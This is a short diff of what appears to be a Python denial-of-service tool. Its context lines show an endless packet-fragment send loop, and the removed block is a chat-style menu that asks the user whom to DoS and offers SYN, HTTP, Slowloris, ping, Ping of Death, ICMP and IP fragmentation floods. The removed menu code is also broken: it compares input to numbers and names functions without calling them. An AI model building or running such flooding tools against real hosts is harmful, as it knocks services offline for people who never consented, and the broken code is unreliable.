@@ -182,28 +182,6 @@ def main():
             counter+=1
             while(1):
                 send(fragment)
-    elif option == 8:
-        name = input("Whats your name?: ")
-        print("nice to meet you " + name)
-        aaa = input("How can i help you today?: ")
-        if aaa in ['dos', 'ddos', 'DDoS', 'DoS', 'DOS', 'DDOS', 'Dos', 'Ddos']:
-            victim = input("Who you want me to DoS?: ")
-            print("Ok, i'm gonna DoS " + victim)
-            time.sleep(2)
-            print("      [Menu]      ")
-            print("1) SYN Flood Attack (Doesn't work on Termux)")
-            print("2) HTTP Flood Attack")
-            print("3) Slowloris Ping Attack")
-            print("4) Ping Flood Attack")
-            print("5) Ping of Death Attack (Doesn't work on Termux)")
-            print("6) ICMP Flood Attack (Doesn't work on Termux)")
-            print("7) IP Fragmentation Attack")
-            ccc = input("What DoS attacck do you want me to do? (insert number): ")
-            if ccc == 1:
-                synflood
-            elif ccc == 2:
-                httpflood
-	
 	
 if __name__ == "__main__":
     main()
